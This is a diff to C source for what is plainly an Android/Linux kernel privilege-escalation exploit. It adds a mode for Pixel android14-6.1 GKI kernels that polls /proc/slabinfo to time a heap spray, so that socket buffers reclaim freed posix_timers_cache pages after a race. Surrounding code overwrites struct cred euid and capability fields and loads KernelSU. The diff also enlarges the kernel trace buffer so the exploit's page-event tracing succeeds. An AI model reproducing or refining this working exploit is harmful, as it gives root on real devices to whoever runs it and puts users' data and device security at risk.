@@ -102,6 +102,11 @@ struct timer_cfg
     unsigned long long cred_euid_off;      /* struct cred.euid (zero plant) */
     unsigned long long cred_cap_off;       /* struct cred.cap_inheritable */
     int cred_cap_count;                    /* how many cap words to fill */
+    /* Set for kernels whose order-1 slab frees go through the PCP lists and
+     * emit no mm_page_free events (e.g. Pixel android14-6.1 GKI).  Instead
+     * of waiting for the free event, the spray is gated on /proc/slabinfo
+     * showing the victim's timers actually freed. */
+    int pcp_free;
     char ksu_kmi[64];                      /* KernelSU late-load --kmi */
 };
 static struct timer_cfg g_cfg;
@@ -186,6 +191,32 @@ static void parse_conf_line(char *line)
     else if (!strcmp(key, "cred_euid_off")) g_cfg.cred_euid_off = num;
     else if (!strcmp(key, "cred_cap_off")) g_cfg.cred_cap_off = num;
     else if (!strcmp(key, "cred_cap_count")) g_cfg.cred_cap_count = (int)num;
+    else if (!strcmp(key, "pcp_free")) g_cfg.pcp_free = (int)num;
+}
+
+/* posix_timers_cache active object count from /proc/slabinfo, or -1. */
+static long slab_active(void)
+{
+    FILE *f = fopen("/proc/slabinfo", "r");
+    char ln[256];
+    long r = -1;
+
+    if (!f)
+        return -1;
+    while (fgets(ln, sizeof(ln), f))
+    {
+        if (!strncmp(ln, "posix_timers_cache", 18))
+        {
+            unsigned a, t, sz, ops, pps;
+
+            if (sscanf(ln, "posix_timers_cache %u %u %u %u %u",
+                       &a, &t, &sz, &ops, &pps) == 5)
+                r = (long)a;
+            break;
+        }
+    }
+    fclose(f);
+    return r;
 }
 
 static int load_conf(const char *path)
@@ -1191,6 +1222,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
 {
     unsigned long long ptrs[NTIMERS];
     unsigned long long pfn = 0, slab_pfn = 0;
+    long slab_base = -1;
     unsigned char *payload = NULL;
     pthread_t th[SPRAY_THREADS];
     struct spray_arg args[SPRAY_THREADS];
@@ -1422,6 +1454,8 @@ static void run_plant(unsigned long long target, int tag, int mode,
             pthread_create(&th[i], NULL, spray_thread, &args[i]);
         }
     }
+    if (g_cfg.pcp_free)
+        slab_base = slab_active();
     /*
      * Release the race without spray CPU contention; V is already captured,
      * so the burst can start immediately after the zombie appears.
@@ -1470,6 +1504,26 @@ static void run_plant(unsigned long long target, int tag, int mode,
         logf("[-] plant%d reap status not SIGKILL; holding zombie\n", tag);
         g_held++;
         return;
+    }
+    if (g_cfg.pcp_free)
+    {
+        /* PCP kernels emit no mm_page_free for order-1 slab discards, so
+         * there is no free event to gate phase 2 on.  Wait until slabinfo
+         * shows the victim's timers actually freed, then spray immediately:
+         * the discarded pages sit on the freeing CPU's PCP lists, where the
+         * socket-buffer allocations reclaim them. */
+        long t0 = now_ms();
+        long now = slab_base;
+
+        while (slab_base > 0 && now > 0 &&
+               now > slab_base - 2000 && now_ms() - t0 < 30000)
+        {
+            usleep(200000);
+            now = slab_active();
+        }
+        logf("[+] plant%d pcp reclaim go (slab %ld -> %ld, %ldms)\n",
+             tag, slab_base, now, now_ms() - t0);
+        atomic_store(&g_burst2, 1);
     }
     atomic_store(&g_burst, 1);
     /*
@@ -1764,6 +1818,22 @@ int main(int argc, char **argv)
     int argi = 1;
 
     setvbuf(stdout, NULL, _IONBF, 0);
+
+    /*
+     * Reboots reset the trace ring to ~7 KB per CPU, which the ids stage
+     * (4 MB mmap churn) overruns and then reports "page event ids not
+     * found" (pairs=0).  Raise it before any tracing; silently keep the
+     * old behaviour if the fs is not writable by the current uid.
+     */
+    {
+        FILE *bf = fopen(TR "/buffer_size_kb", "w");
+
+        if (bf)
+        {
+            (void)!fwrite("8192", 1, 4, bf);
+            fclose(bf);
+        }
+    }
 
     /* child re-exec with "wait": block and report, no conf needed */
     if (argc > 1 && !strcmp(argv[1], "wait"))
